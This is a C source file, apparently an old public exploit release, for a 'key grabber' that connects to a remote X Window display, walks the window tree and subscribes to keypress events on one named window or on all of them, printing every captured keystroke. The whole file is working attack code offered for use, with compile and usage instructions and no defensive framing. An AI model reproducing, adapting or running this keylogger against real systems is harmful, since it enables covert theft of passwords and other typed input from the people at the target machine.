// --------------------------------------------------------
// XWindow KeyStroke Exploit By -= Crashkiller =-
// Vulnerable Versions : All Xwindows
// Patch               : There is no patch
// Thx to              : whole #hackingpl
// ---------------------------------------------------------
// Compile : gcc -o xkey xkey.c -lX11
//

#include <stdio.h>
#include <X11/X.h>
#include <X11/Xlib.h>
#include <X11/Intrinsic.h>
#include <X11/StringDefs.h>
#include <X11/Xutil.h>
#include <X11/Shell.h>

Display *x;
  char name[255];
static char buforek[256];
void selectelement(Window root);
char *convertit(XEvent *vic);
int find=0;

void main(int argc,char *argv[]) {
  int i,pipe;
  char host[255];
  XEvent xev;
  char *getit;
       fprintf(stderr,"\n----------------------------\n");
         fprintf(stderr,"--- KEY GRABBER FOR XWIN ---\n");
	 fprintf(stderr,"--- Coded By Crashkiller ---\n");
         fprintf(stderr,"----------------------------\n");
    if (argc<3) { 
         fprintf(stderr,"Usage : %s [host] [element-name]\n",argv[0]);
         fprintf(stderr,"[host] - host to connect to eg.localhost\n");
         fprintf(stderr,"[element-name] - the name of element rg.xiterm or \n you can type here ALL\n");
	 
         exit(-1);
	 }
if (strlen(argv[1])>254) {
         fprintf(stderr,"Host Too Long\n");
	 exit(-1);
	 }
if (strlen(argv[2])>254) {
         fprintf(stderr,"Element Name Too Long\n");
	 exit(-1);
	 }
strcpy(host,argv[1]);
strcpy(name,argv[2]);
if (argc>3) {strcat(name," ");strcat(name,argv[3]); }
if (argc>4) {strcat(name," ");strcat(name,argv[4]); }
if (argc>5) {strcat(name," ");strcat(name,argv[5]); }
if (argc>6) {strcat(name," ");strcat(name,argv[6]); }

fprintf(stderr,"Element : %s \n",name);
printf("Connecting to : %s \n",host);
strcat(host,":0.0");
x = XOpenDisplay(host);
if (!x) { 
         fprintf(stderr,"Cant connect to display!\n");
	 exit(-1);
	 }
printf("Connected successfull ......\n");
printf("-= Element list : \n");
selectelement(DefaultRootWindow(x));
if (strcmp(name,"ALL")==0) { 
fprintf(stderr,"\nSniffing All Elements ! \n");
} else {
if (find==1) {
    fprintf(stderr,"\nElement Found ! \n -= Sniffing %s\n",name);} else 
    { 
    fprintf(stderr,"\nCant Find Selected Element!! \n");
    XCloseDisplay(x);
    exit(-1);
}}

// Grab Keys From Element

 while (1) {
 XNextEvent(x , &xev);
 getit = convertit(&xev);
 if (getit==NULL) continue;
 if (*getit=='\r') fprintf(stderr," [enter] \n");
 else if (strlen(getit)==1) fprintf(stderr,"%s",getit); else fprintf(stderr," [%s] ",getit);
 fflush(stdout);
}
}
void selectelement(Window root) {
   int suckit;
   int a,c;
   unsigned int nchildren;
   Window parent,*children;
   char *windowname;
     
suckit = XQueryTree(x, root, &root, &parent, &children, &nchildren);
if (suckit == FALSE) {
         fprintf(stderr,"Cant query tree !\n");
	 return;
         }
if (nchildren==0) return;

if (strcmp(name,"ALL")!=0) {
for (a=0; a<nchildren; a++) { 
 XFetchName(x, children[a], &windowname);
 if (windowname) {
  fprintf(stderr," %s ,",windowname);
   if (strcmp(windowname,name)==0) { 
        find=1;
	XSelectInput(x, children[a], KeyPressMask); 
	 }
   }
        selectelement(children[a]);
} 
 } 
if (strcmp(name,"ALL")==0) {
for (a=0; a<nchildren; a++) { 
	XSelectInput(x, children[a], KeyPressMask); 
        selectelement(children[a]);
    }
}
}
char *convertit(XEvent *vic) {
    int c;
    KeySym ks;
    char *tmp;
bzero(buforek,sizeof(buforek));
if (vic) {
   c = XLookupString((XKeyEvent *)vic, buforek, 255, &ks, NULL );
   buforek[c]='\0';

   if (c==0) {
   tmp = XKeysymToString(ks);
   if (tmp) { strcpy (buforek,tmp); }  else { strcpy(buforek," ? ");}
   }
    return buforek;
   } else {
       return NULL; }
}